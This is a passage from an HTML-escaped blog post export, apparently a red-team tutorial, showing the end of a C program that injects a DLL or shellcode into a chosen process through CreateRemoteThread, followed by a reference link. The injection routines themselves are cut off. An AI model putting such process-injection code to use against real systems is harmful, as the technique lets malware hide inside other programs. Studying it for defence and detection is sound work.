class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] CreateRemoteThread success\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (argc != <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;useage: ReomteThreadInjection.exe &lt;pid&gt; &lt;dll/shellcode&gt;\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD dwPId = <span class=\"built_in\">atol</span>(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\tCHAR* lpMethod = argv[<span class=\"number\">2</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"built_in\">lstrcmp</span>(<span class=\"string\">&quot;dll&quot;</span>, lpMethod))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">InjectDll</span>(dwPId);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!<span class=\"built_in\">lstrcmp</span>(<span class=\"string\">&quot;shellcode&quot;</span>, lpMethod))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">InjectShellcode</span>(dwPId);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] Method error\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x5-参考\"><a href=\"#0x5-参考\" class=\"headerlink\" title=\"0x5 参考\"></a>0x5 参考</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">https://www.cnblogs.com/LittleHann/p/6336950.html</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows","readteam"]}]